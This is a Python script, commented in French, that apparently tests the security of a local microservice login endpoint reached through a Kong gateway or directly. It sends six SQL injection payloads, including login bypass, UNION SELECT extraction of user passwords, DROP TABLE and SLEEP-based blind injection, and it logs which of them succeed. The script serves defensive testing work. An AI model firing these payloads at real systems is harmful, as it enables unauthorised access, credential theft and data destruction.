"""
sql_injection.py
────────────────
Phase 3 — Simulation d'attaques SQL Injection
Cible : user-service via Kong (localhost:8000) ou direct (localhost:5001)

Usage:
  python sql_injection.py                  # via Kong port 8000
  python sql_injection.py --direct         # direct port 5001
"""

import requests
import json
import argparse
from datetime import datetime

# ── Cibles ───────────────────────────────────────────────────────
KONG_BASE   = "http://localhost:8000"
DIRECT_BASE = "http://localhost:5001"

# ── Payloads SQL Injection ───────────────────────────────────────
PAYLOADS = [
    {
        "name": "OR bypass classique",
        "body": {"username": "admin' OR '1'='1", "password": "anything"},
        "desc": "Court-circuite la condition WHERE username=..."
    },
    {
        "name": "Commentaire SQL",
        "body": {"username": "admin'--", "password": "anything"},
        "desc": "Commente le reste de la requête SQL"
    },
    {
        "name": "Toujours vrai",
        "body": {"username": "' OR 1=1 --", "password": "x"},
        "desc": "Condition toujours vraie"
    },
    {
        "name": "UNION SELECT",
        "body": {"username": "' UNION SELECT NULL,username,password FROM users--", "password": "x"},
        "desc": "Extraction de données par UNION"
    },
    {
        "name": "DROP TABLE",
        "body": {"username": "'; DROP TABLE users; --", "password": "x"},
        "desc": "Tentative de suppression de table"
    },
    {
        "name": "Blind injection (sleep)",
        "body": {"username": "' OR SLEEP(3)--", "password": "x"},
        "desc": "Blind SQLi basée sur le délai de réponse"
    },
]

logs = []

def run(base_url: str):
    url = f"{base_url}/users/login"
    print(f"\n{'='*55}")
    print(f"  SQL INJECTION → {url}")
    print(f"{'='*55}\n")

    for p in PAYLOADS:
        print(f"  [*] {p['name']}")
        print(f"      Payload : {p['body']['username']}")
        print(f"      Objectif: {p['desc']}")

        try:
            r = requests.post(url, json=p["body"], timeout=5)
            status = r.status_code
            body   = r.text

            # Heuristique : login réussi avec faux password = suspect
            vuln = (status == 200 and "token" in body)

            verdict = "VULNERABLE ⚠️ " if vuln else "Bloque / Sans effet ✅"
            print(f"      HTTP    : {status}")
            print(f"      Reponse : {body[:150]}")
            print(f"      Verdict : {verdict}\n")

        except requests.exceptions.Timeout:
            status, body, vuln = 408, "TIMEOUT (possible blind SQLi)", True
            print(f"      HTTP    : TIMEOUT — possible blind injection reussie ⚠️\n")

        except requests.exceptions.ConnectionError:
            print(f"      ERREUR  : Service non joignable sur {url}\n")
            continue

        logs.append({
            "timestamp"   : datetime.utcnow().isoformat() + "Z",
            "type"        : "SQL_INJECTION",
            "payload_name": p["name"],
            "url"         : url,
            "payload_sent": p["body"],
            "http_status" : status,
            "response"    : body[:300],
            "vulnerable"  : vuln,
        })

    # Sauvegarde
    with open("sql_injection_logs.json", "w") as f:
        json.dump(logs, f, indent=2, ensure_ascii=False)

    total = len(logs)
    vulns = sum(1 for l in logs if l["vulnerable"])
    print(f"{'='*55}")
    print(f"  Resultats : {total} tests | {vulns} vulnérable(s) | {total-vulns} bloqués")
    print(f"  Logs      : sql_injection_logs.json")
    print(f"{'='*55}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--direct", action="store_true",
                        help="Attaque directe port 5001 (bypass Kong)")
    args = parser.parse_args()

    base = DIRECT_BASE if args.direct else KONG_BASE
    mode = "DIRECT port 5001" if args.direct else "via Kong port 8000"
    print(f"\n  Mode : {mode}")

    run(base)